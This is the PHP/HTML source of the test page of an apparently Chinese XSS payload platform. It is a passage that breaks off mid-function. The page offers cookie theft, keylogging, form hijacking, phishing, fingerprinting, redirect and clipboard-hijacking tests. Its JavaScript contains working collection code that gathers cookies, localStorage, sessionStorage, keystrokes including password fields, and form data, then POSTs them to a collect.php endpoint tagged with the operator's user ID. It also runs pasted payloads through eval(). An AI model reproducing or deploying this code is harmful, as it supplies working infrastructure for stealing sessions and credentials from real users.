<?php
/**
 * Payload测试页面 - 公开访问但需要登录才能使用
 */
require_once 'config.php';
session_start();

// 检查登录状态
$isLoggedIn = isLoggedIn();
$userId = $isLoggedIn ? getUserId() : 0;
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Payload测试平台 - 专业XSS漏洞检测工具 | 蓝莲花XSS在线平台</title>
    <meta name="description" content="专业的XSS Payload测试平台，提供Cookie窃取、键盘记录、表单劫持、GPS定位、钓鱼页面、浏览器指纹、DOM劫持等7大XSS漏洞检测功能，实时数据回传监控，助力网络安全渗透测试。">
    <meta name="keywords" content="XSS测试,XSS Payload,跨站脚本攻击,安全测试,渗透测试,Cookie窃取,键盘记录,表单劫持,钓鱼攻击,浏览器指纹,DOM劫持,网络安全,漏洞检测">
    <meta name="author" content="蓝莲花安全团队">
    <meta name="robots" content="index, follow">
    <link rel="canonical" href="https://xss.li/payload-test.html">
    
    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://xss.li/payload-test.html">
    <meta property="og:title" content="XSS Payload测试平台 - 专业XSS漏洞检测工具">
    <meta property="og:description" content="专业的XSS Payload测试平台，提供7大XSS漏洞检测功能，实时数据回传监控，助力网络安全渗透测试。">
    <meta property="og:image" content="https://xss.li/tu/xssicon.png">
    
    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://xss.li/payload-test.html">
    <meta property="twitter:title" content="XSS Payload测试平台 - 专业XSS漏洞检测工具">
    <meta property="twitter:description" content="专业的XSS Payload测试平台，提供7大XSS漏洞检测功能，实时数据回传监控。">
    <meta property="twitter:image" content="https://xss.li/tu/xssicon.png">
    
    <!-- 移动端优化 -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="format-detection" content="telephone=no">
    
    <link rel="icon" type="image/png" href="tu/xssicon.png">
    <link rel="apple-touch-icon" href="tu/xssicon.png">
    
    <!-- 本地化资源 -->
    <link href="static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="static/libs/fontawesome/css/all.min.css">
    
    <style>
        :root {
            --bg-primary: #000000;
            --bg-secondary: #0d0d0d;
            --bg-tertiary: #1a1a1a;
            --neon-green: #00ff41;
            --neon-red: #ff0040;
            --neon-cyan: #00ffff;
            --neon-purple: #9d00ff;
            --neon-orange: #ff6600;
            --border-color: rgba(0, 255, 65, 0.3);
            --text-primary: #00ff41;
            --text-secondary: #888888;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000000;
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(0, 255, 65, 0.03) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(255, 0, 64, 0.03) 0%, transparent 50%),
                radial-gradient(circle at 40% 20%, rgba(157, 0, 255, 0.03) 0%, transparent 50%);
            color: var(--text-primary);
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }
        
        /* 背景网格动画 */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: grid-move 20s linear infinite;
            pointer-events: none;
            z-index: 0;
        }
        
        @keyframes grid-move {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }
        
        /* 浮动粒子 */
        .particle {
            position: fixed;
            width: 3px;
            height: 3px;
            background: var(--neon-green);
            border-radius: 50%;
            opacity: 0.6;
            animation: float 15s infinite;
            pointer-events: none;
            z-index: 1;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
            10% { opacity: 0.6; }
            50% { transform: translateY(-100vh) translateX(50px); opacity: 0.3; }
            90% { opacity: 0.6; }
        }
        
        .container {
            position: relative;
            z-index: 10;
            padding: 20px;
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* 头部 */
        .header {
            text-align: center;
            padding: 40px 20px;
            position: relative;
        }
        
        .logo-ascii {
            font-size: 0.7rem;
            line-height: 1.2;
            color: var(--neon-green);
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
            margin-bottom: 20px;
            white-space: pre;
        }
        
        h1 {
            font-size: 2.5rem;
            background: linear-gradient(45deg, var(--neon-green), var(--neon-cyan), var(--neon-red));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            font-weight: bold;
            text-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
            animation: glitch 3s infinite;
        }
        
        @keyframes glitch {
            0%, 100% { text-shadow: 0 0 30px rgba(0, 255, 65, 0.5); }
            25% { text-shadow: -2px 0 30px rgba(255, 0, 64, 0.5); }
            50% { text-shadow: 2px 0 30px rgba(0, 255, 255, 0.5); }
            75% { text-shadow: 0 2px 30px rgba(157, 0, 255, 0.5); }
        }
        
        .subtitle {
            color: var(--text-secondary);
            font-size: 1.1rem;
            margin-bottom: 30px;
        }
        
        /* 测试卡片 */
        .test-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }
        
        .test-card {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.95), rgba(13, 13, 13, 0.95));
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 25px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(0, 255, 65, 0.1);
        }
        
        .test-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, var(--neon-green), transparent 30deg);
            animation: rotate 4s linear infinite;
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .test-card:hover::before {
            opacity: 0.1;
        }
        
        .test-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.2);
            border-color: var(--neon-green);
        }
        
        @keyframes rotate {
            100% { transform: rotate(360deg); }
        }
        
        .test-card-content {
            position: relative;
            z-index: 1;
        }
        
        .test-title {
            color: var(--neon-green);
            font-size: 1.3rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .test-title i {
            font-size: 1.5rem;
        }
        
        .test-desc {
            color: var(--text-secondary);
            font-size: 0.9rem;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        
        /* 表单样式 */
        .form-control {
            background: rgba(0, 0, 0, 0.4) !important;
            border: 1px solid rgba(0, 255, 65, 0.3) !important;
            color: var(--text-primary) !important;
            border-radius: 8px !important;
            padding: 10px 15px !important;
            font-family: 'Courier New', monospace !important;
            transition: all 0.3s ease;
        }
        
        .form-control:focus {
            background: rgba(0, 0, 0, 0.6) !important;
            border-color: var(--neon-green) !important;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2) !important;
            color: var(--neon-green) !important;
        }
        
        .form-control::placeholder {
            color: rgba(160, 160, 160, 0.5);
        }
        
        /* 按钮样式 */
        .btn-test {
            background: linear-gradient(135deg, rgba(0, 255, 65, 0.2), rgba(0, 255, 65, 0.1));
            border: 2px solid var(--neon-green);
            color: var(--neon-green);
            padding: 10px 25px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .btn-test::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(0, 255, 65, 0.3);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.5s, height 0.5s;
        }
        
        .btn-test:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .btn-test:hover {
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
            transform: translateY(-2px);
        }
        
        .btn-test span {
            position: relative;
            z-index: 1;
        }
        
        /* 状态指示器 */
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 2s infinite;
        }
        
        .status-waiting { background: #666; }
        .status-testing { background: var(--neon-blue); }
        .status-success { background: var(--neon-green); }
        .status-error { background: #ff006e; }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; box-shadow: 0 0 5px currentColor; }
            50% { opacity: 0.5; box-shadow: 0 0 15px currentColor; }
        }
        
        /* 结果显示 */
        .result-box {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            display: none;
            font-size: 0.85rem;
            line-height: 1.6;
        }
        
        .result-box.show { display: block; }
        
        .result-success { border-color: var(--neon-green); color: var(--neon-green); }
        .result-error { border-color: #ff006e; color: #ff006e; }
        
        /* 统计面板 */
        .stats-panel {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.95), rgba(13, 13, 13, 0.95));
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5), 0 0 80px rgba(0, 255, 65, 0.1);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }
        
        .stat-item {
            text-align: center;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            border: 1px solid rgba(0, 255, 65, 0.1);
        }
        
        .stat-value {
            font-size: 2.5rem;
            font-weight: bold;
            color: var(--neon-green);
            text-shadow: 0 0 20px rgba(0, 255, 65, 0.8), 0 0 40px rgba(0, 255, 65, 0.4);
            font-family: 'Courier New', monospace;
        }
        
        .stat-label {
            color: var(--text-secondary);
            font-size: 0.9rem;
            margin-top: 5px;
        }
        
        /* 底部导航 */
        .bottom-nav {
            text-align: center;
            padding: 30px;
            margin-top: 30px;
        }
        
        .nav-link {
            display: inline-block;
            margin: 0 15px;
            color: var(--neon-green);
            text-decoration: none;
            transition: all 0.3s ease;
            font-size: 1rem;
        }
        
        .nav-link:hover {
            color: var(--neon-cyan);
            text-shadow: 0 0 15px currentColor, 0 0 30px currentColor;
        }
        
        /* Payload代码框 */
        .payload-code {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 8px;
            padding: 12px;
            margin: 10px 0;
            font-size: 0.75rem;
            color: var(--neon-cyan);
            overflow-x: auto;
            position: relative;
            font-family: 'Courier New', monospace;
        }
        
        .payload-code::before {
            content: '> XSS PAYLOAD';
            display: block;
            color: var(--neon-red);
            font-size: 0.7rem;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        .copy-btn {
            position: absolute;
            top: 8px;
            right: 8px;
            background: rgba(0, 255, 65, 0.2);
            border: 1px solid var(--neon-green);
            color: var(--neon-green);
            padding: 4px 10px;
            font-size: 0.7rem;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .copy-btn:hover {
            background: rgba(0, 255, 65, 0.4);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
        }
        
        /* Payload输入框 */
        .payload-input {
            width: 100%;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 5px;
            padding: 10px;
            color: var(--neon-green);
            font-family: 'Courier New', monospace;
            font-size: 12px;
            resize: vertical;
            min-height: 80px;
            transition: all 0.3s ease;
        }
        
        .payload-input:focus {
            outline: none;
            border-color: var(--neon-cyan);
            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
            background: rgba(0, 0, 0, 0.9);
        }
        
        .payload-input::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }
    </style>
</head>
<body>
    <!-- 粒子背景 -->
    <script>
        // 创建多色粒子
        const colors = ['#00ff41', '#ff0040', '#00ffff', '#9d00ff', '#ff6600'];
        for(let i = 0; i < 30; i++) {
            let particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.background = colors[Math.floor(Math.random() * colors.length)];
            particle.style.animationDelay = Math.random() * 15 + 's';
            particle.style.animationDuration = (10 + Math.random() * 10) + 's';
            document.body.appendChild(particle);
        }
    </script>

    <div class="container">
        <!-- 头部 -->
        <header class="header">
            <div class="logo-ascii">
 ___  _____ _____   ____                 _                 _ 
|  \/  /  _/  _  | | _ \___ _ _  _  _  | |___  __ _ __| |
| |\/| | \_| | | | |  _/ _ \ ' \| || | | / _ \/ _` / _` |
|_|  |_|__/___|_| |_| \___/_||_|\_, | |_\___/\__,_\__,_|
                                |__/                      
            </div>
            <h1><i class="fas fa-code"></i> XSS Payload 测试平台</h1>
            <p class="subtitle">
                <i class="fas fa-shield-alt"></i> 专业的XSS Payload验证工具 · 实时数据回传监控
            </p>
        </header>

        <!-- 统计面板 -->
        <section class="stats-panel" aria-label="测试统计">
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-value" id="totalTests">0</div>
                    <div class="stat-label"><i class="fas fa-vial"></i> 总测试数</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="successTests">0</div>
                    <div class="stat-label"><i class="fas fa-check-circle"></i> 成功测试</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="failedTests">0</div>
                    <div class="stat-label"><i class="fas fa-times-circle"></i> 失败测试</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="activeTests">0</div>
                    <div class="stat-label"><i class="fas fa-spinner"></i> 进行中</div>
                </div>
            </div>
        </section>

        <!-- 测试卡片网格 -->
        <main class="test-grid" role="main">
            <!-- 测试1: Cookie窃取 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-cookie-bite"></i>
                        <span>Cookie窃取测试</span>
                        <span class="status-indicator status-waiting" id="status1"></span>
                    </div>
                    <p class="test-desc">测试XSS Payload能否成功窃取用户Cookie、LocalStorage和SessionStorage数据</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(1)">复制</button>
                        <textarea id="payload1" class="payload-input" rows="4" placeholder="可选：粘贴您的自定义Cookie窃取Payload代码..."></textarea>
                    </div>
                    
                    <input type="text" class="form-control mb-2" id="testCookie" placeholder="测试Cookie: session_id=abc123xyz">
                    <button class="btn-test" onclick="testCookiePayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result1"></div>
                </div>
            </article>

            <!-- 测试2: GPS定位 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-map-marker-alt"></i>
                        <span>GPS地理定位测试</span>
                        <span class="status-indicator status-waiting" id="status7"></span>
                    </div>
                    <p class="test-desc">测试Payload能否获取用户地理位置信息（经纬度、精度、海拔）</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(7)">复制</button>
                        <textarea id="payload7" class="payload-input" rows="3" placeholder="可选：粘贴您的自定义GPS定位Payload代码..."></textarea>
                    </div>
                    
                    <div id="mapPreview" style="background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,65,0.3); border-radius: 8px; padding: 15px; margin: 10px 0; min-height: 100px; display: flex; align-items: center; justify-content: center; color: #888;">
                        <i class="fas fa-map-marked-alt" style="font-size: 2rem; margin-right: 15px;"></i>
                        <span>点击测试后将显示地理位置信息</span>
                    </div>
                    
                    <button class="btn-test" onclick="testGPSPayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result7"></div>
                </div>
            </article>

            <!-- 测试3: 键盘记录 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-keyboard"></i>
                        <span>键盘记录测试</span>
                        <span class="status-indicator status-waiting" id="status2"></span>
                    </div>
                    <p class="test-desc">测试Payload能否捕获用户键盘输入，包括密码字段</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(2)">复制</button>
                        <textarea id="payload2" class="payload-input" rows="3" placeholder="可选：粘贴您的自定义键盘记录Payload代码..."></textarea>
                    </div>
                    
                    <input type="text" class="form-control mb-2" id="keylogInput" placeholder="在此输入文本测试...">
                    <input type="password" class="form-control mb-2" id="keylogPassword" placeholder="输入密码: P@ssw0rd123">
                    <button class="btn-test" onclick="testKeylogPayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result2"></div>
                </div>
            </article>

            <!-- 测试4: 表单劫持 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-user-secret"></i>
                        <span>表单劫持测试</span>
                        <span class="status-indicator status-waiting" id="status3"></span>
                    </div>
                    <p class="test-desc">测试Payload能否拦截并窃取表单提交数据</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(3)">复制</button>
                        <textarea id="payload3" class="payload-input" rows="3" placeholder="可选：粘贴您的自定义表单劫持Payload代码..."></textarea>
                    </div>
                    
                    <form id="testForm" onsubmit="return false;">
                        <input type="text" class="form-control mb-2" name="username" placeholder="用户名: admin">
                        <input type="password" class="form-control mb-2" name="password" placeholder="密码: Admin@2024">
                        <input type="email" class="form-control mb-2" name="email" placeholder="邮箱: admin@example.com">
                    </form>
                    <button class="btn-test" onclick="testFormPayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result3"></div>
                </div>
            </article>

            <!-- 测试5: 页面钓鱼 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-fish"></i>
                        <span>钓鱼页面测试</span>
                        <span class="status-indicator status-waiting" id="status4"></span>
                    </div>
                    <p class="test-desc">测试Payload能否创建伪造登录框窃取凭证</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(4)">复制</button>
                        <textarea id="payload4" class="payload-input" rows="3" placeholder="可选：粘贴您的自定义钓鱼Payload代码..."></textarea>
                    </div>
                    
                    <input type="text" class="form-control mb-2" id="phishUser" placeholder="输入用户名: victim">
                    <input type="password" class="form-control mb-2" id="phishPass" placeholder="输入密码: Victim@123">
                    <button class="btn-test" onclick="testPhishingPayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result4"></div>
                </div>
            </article>

            <!-- 测试6: 浏览器指纹 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-fingerprint"></i>
                        <span>浏览器指纹测试</span>
                        <span class="status-indicator status-waiting" id="status5"></span>
                    </div>
                    <p class="test-desc">测试Payload能否收集浏览器信息和设备指纹</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(5)">复制</button>
                        <textarea id="payload5" class="payload-input" rows="3" placeholder="可选：粘贴您的自定义指纹收集Payload代码..."></textarea>
                    </div>
                    
                    <button class="btn-test" onclick="testFingerprintPayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result5"></div>
                </div>
            </article>

            <!-- 测试7: DOM劫持 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-code-branch"></i>
                        <span>DOM劫持测试</span>
                        <span class="status-indicator status-waiting" id="status6"></span>
                    </div>
                    <p class="test-desc">测试Payload能否劫持和修改页面DOM结构</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(6)">复制</button>
                        <textarea id="payload6" class="payload-input" rows="3" placeholder="可选：粘贴您的自定义DOM劫持Payload代码..."></textarea>
                    </div>
                    
                    <div id="domTarget" style="padding: 10px; background: rgba(0,255,65,0.1); border-radius: 5px; margin-bottom: 10px;">
                        <p style="margin: 0;">原始内容: 这是一段测试文本</p>
                    </div>
                    <button class="btn-test" onclick="testDOMPayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result6"></div>
                </div>
            </article>
            
            <!-- 测试8: 页面重定向 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-external-link-alt"></i>
                        <span>页面重定向测试</span>
                        <span class="status-indicator status-waiting" id="status8"></span>
                    </div>
                    <p class="test-desc">测试Payload能否将用户重定向到指定页面（钓鱼、流量劫持）</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(8)">复制</button>
                        <textarea id="payload8" class="payload-input" rows="3" placeholder="可选：粘贴您的自定义重定向Payload代码..."></textarea>
                    </div>
                    
                    <input type="text" class="form-control mb-2" id="redirectUrl" placeholder="目标URL: https://www.example.com" value="https://www.baidu.com">
                    <button class="btn-test" onclick="testRedirectPayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result8"></div>
                </div>
            </article>
            
            <!-- 测试9: 剪贴板劫持 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-clipboard"></i>
                        <span>剪贴板劫持测试</span>
                        <span class="status-indicator status-waiting" id="status9"></span>
                    </div>
                    <p class="test-desc">测试Payload能否监听并窃取用户剪贴板内容</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(9)">复制</button>
                        <textarea id="payload9" class="payload-input" rows="3" placeholder="可选：粘贴您的自定义剪贴板劫持Payload代码..."></textarea>
                    </div>
                    
                    <input type="text" class="form-control mb-2" id="clipboardTest" placeholder="复制一些文本试试...例如：我的银行卡号昦12345678">
                    <button class="btn-test" onclick="testClipboardPayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result9"></div>
                </div>
            </article>
            
            <!-- 测试10: 基础Alert弹窗 -->
            <article class="test-card">
                <div class="test-card-content">
                    <div class="test-title">
                        <i class="fas fa-exclamation-triangle"></i>
                        <span>Alert弹窗测试</span>
                        <span class="status-indicator status-waiting" id="status10"></span>
                    </div>
                    <p class="test-desc">测试基础XSS Payload能否触发JavaScript弹窗（最简单的XSS验证）</p>
                    
                    <div class="payload-code">
                        <button class="copy-btn" onclick="copyPayload(10)">复制</button>
                        <textarea id="payload10" class="payload-input" rows="3" placeholder="可选：粘贴您的自定义Alert Payload代码..."></textarea>
                    </div>
                    
                    <input type="text" class="form-control mb-2" id="alertMessage" placeholder="自定义弹窗消息" value="XSS漏洞测试成功！">
                    <button class="btn-test" onclick="testAlertPayload()">
                        <span><i class="fas fa-play"></i> 执行测试</span>
                    </button>
                    <div class="result-box" id="result10"></div>
                </div>
            </article>
        </main>

        <!-- 底部导航 -->
        <nav class="bottom-nav" aria-label="主导航">
            <a href="index.html" class="nav-link"><i class="fas fa-home"></i> 返回首页</a>
            <a href="login.php" class="nav-link"><i class="fas fa-sign-in-alt"></i> 后台登录</a>
            <a href="wiki.html" class="nav-link"><i class="fas fa-book"></i> 使用文档</a>
            <a href="templates.php" class="nav-link"><i class="fas fa-code"></i> Payload库</a>
        </nav>
    </div>

    <script src="static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
    
    <script>
        // 当前用户ID（从 PHP 获取）
        const IS_LOGGED_IN = <?php echo $isLoggedIn ? 'true' : 'false'; ?>;
        const CURRENT_USER_ID = <?php echo $userId; ?>;
        const API_URL = `/api/collect.php?uid=${CURRENT_USER_ID}`;
        
        console.log('🔐 登录状态:', IS_LOGGED_IN);
        if (IS_LOGGED_IN) {
            console.log('👤 当前用户ID:', CURRENT_USER_ID);
            console.log('🌐 API地址:', API_URL);
        } else {
            console.log('⚠️ 未登录，功能已禁用。请登录后使用。');
        }
        
        // 设置测试Cookie和数据
        document.cookie = "session_id=test_xss_session_" + Date.now() + "; path=/";
        localStorage.setItem('user_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9');
        sessionStorage.setItem('temp_data', 'XSS_TEST_DATA_' + Date.now());

        let stats = {
            total: 0,
            success: 0,
            failed: 0,
            active: 0
        };

        function updateStats() {
            document.getElementById('totalTests').textContent = stats.total;
            document.getElementById('successTests').textContent = stats.success;
            document.getElementById('failedTests').textContent = stats.failed;
            document.getElementById('activeTests').textContent = stats.active;
        }

        function updateStatus(testId, status, message) {
            const statusEl = document.getElementById('status' + testId);
            const resultEl = document.getElementById('result' + testId);
            
            statusEl.className = 'status-indicator status-' + status;
            resultEl.className = 'result-box show result-' + status;
            resultEl.innerHTML = message;
            
            if (status === 'success') {
                stats.success++;
                stats.active--;
            } else if (status === 'error') {
                stats.failed++;
                stats.active--;
            } else if (status === 'testing') {
                stats.active++;
                stats.total++;
            }
            
            updateStats();
        }
        
        // 检查登录状态的辅助函数
        function checkLogin() {
            if (!IS_LOGGED_IN) {
                alert('⚠️ 请先登录\n\n您需要登录才能使用测试功能。\n点击右上角登录按钮进行登录。');
                // 可选：跳转到登录页
                if (confirm('是否立即跳转到登录页面？')) {
                    window.location.href = '/login.php?redirect=' + encodeURIComponent(window.location.pathname);
                }
                return false;
            }
            return true;
        }

        // 测试1: Cookie窃取
        async function testCookiePayload() {
            if (!checkLogin()) return;
            
            updateStatus(1, 'testing', '<i class="fas fa-spinner fa-spin"></i> 正在执行Cookie窃取测试...');
            
            try {
                // 检查是否有自定义Payload
                const customPayload = document.getElementById('payload1').value.trim();
                
                if (customPayload) {
                    // 执行自定义Payload
                    console.log('📤 执行自定义Cookie窃取Payload');
                    eval(customPayload);
                    updateStatus(1, 'success', `<i class="fas fa-check-circle"></i> 自定义Payload已执行（请检查后台数据）`);
                    return;
                }
                
                // 使用默认测试
                const cookieData = {
                    type: 'cookie_steal',
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage),
                    test_cookie: document.getElementById('testCookie').value || '测试Cookie数据',
                    timestamp: new Date().toISOString(),
                    user_id: CURRENT_USER_ID
                };
                
                console.log('📤 发送Cookie数据:', cookieData);

                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(cookieData)
                });
                
                console.log('📥 响应状态:', response.status, response.statusText);
                
                if (!response.ok) {
                    const errorText = await response.text();
                    console.error('❌ 响应错误:', errorText);
                    throw new Error(`HTTP ${response.status}: ${errorText.substring(0, 100)}`);
                }

                const data = await response.json();
                console.log('✅ 响应数据:', data);
                
                if (data.status === 'success') {
                    updateStatus(1, 'success', `
                        <strong><i class="fas fa-check-circle"></i> Cookie窃取成功！</strong><br>
                        <small>
                        • Cookie数据: ${document.cookie.substring(0, 50)}...<br>
                        • LocalStorage: ${Object.keys(localStorage).length} 项<br>
                        • SessionStorage: ${Object.keys(sessionStorage).length} 项<br>
                        • 数据ID: ${data.id}<br>
                        • 用户ID: ${CURRENT_USER_ID}<br>
                        • 提示: 请前往后台查看完整数据
                        </small>
                    `);
                } else {
                    throw new Error(data.message || '未知错误');
                }
            } catch (error) {
                console.error('❌ Cookie测试失败:', error);
                updateStatus(1, 'error', `<i class="fas fa-times-circle"></i> 测试失败: ${error.message}`);
            }
        }

        // 测试2: 键盘记录
        let keystrokes = [];
        async function testKeylogPayload() {
            if (!checkLogin()) return;
            
            updateStatus(2, 'testing', '<i class="fas fa-spinner fa-spin"></i> 键盘记录器已激活，请输入至少5个字符...');
            
            const input = document.getElementById('keylogInput');
            const password = document.getElementById('keylogPassword');
            
            keystrokes = [];
            
            const handler = async (e) => {
                keystrokes.push({
                    key: e.key,
                    type: e.target.type,
                    time: new Date().toISOString()
                });
                
                if (keystrokes.length >= 5) {
                    input.removeEventListener('keydown', handler);
                    password.removeEventListener('keydown', handler);
                    
                    try {
                        const payload = {
                            type: 'keylogger',
                            keystrokes: keystrokes,
                            captured_text: input.value + ' | ' + password.value,
                            user_id: CURRENT_USER_ID
                        };
                        
                        console.log('⌨️ 发送键盘记录:', payload);
                        
                        const response = await fetch(API_URL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(payload)
                        });
                        
                        if (!response.ok) {
                            throw new Error(`HTTP ${response.status}`);
                        }
                        
                        const data = await response.json();
                        console.log('✅ 键盘记录响应:', data);
                        
                        if (data.status === 'success') {
                            updateStatus(2, 'success', `
                                <strong><i class="fas fa-check-circle"></i> 键盘记录成功！</strong><br>
                                <small>
                                • 捕获按键: ${keystrokes.length} 个<br>
                                • 文本内容: ${input.value || '(空)'}<br>
                                • 密码字段: ${'*'.repeat(password.value.length)}<br>
                                • 数据ID: ${data.id}<br>
                                • 用户ID: ${CURRENT_USER_ID}
                                </small>
                            `);
                        }
                    } catch (error) {
                        console.error('❌ 键盘记录失败:', error);
                        updateStatus(2, 'error', `<i class="fas fa-times-circle"></i> 上报失败: ${error.message}`);
                    }
                }
            };
            
            input.addEventListener('keydown', handler);
            password.addEventListener('keydown', handler);
            input.focus();
        }

        // 测试3: 表单劫持
        async function testFormPayload() {
            if (!checkLogin()) return;
            
            updateStatus(3, 'testing', '<i class="fas fa-spinner fa-spin"></i> 正在劫持表单数据...');
            
            try {
                const form = document.getElementById('testForm');
                const formData = new FormData(form);
                const data = {};
                
                formData.forEach((value, key) => {
                    data[key] = value;
                });
                
                const payload = {
                    type: 'form_hijack',
                    formData: data,
                    timestamp: new Date().toISOString(),
                    user_id: CURRENT_USER_ID
                };
                
                console.log('📋 发送表单数据:', payload);

                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
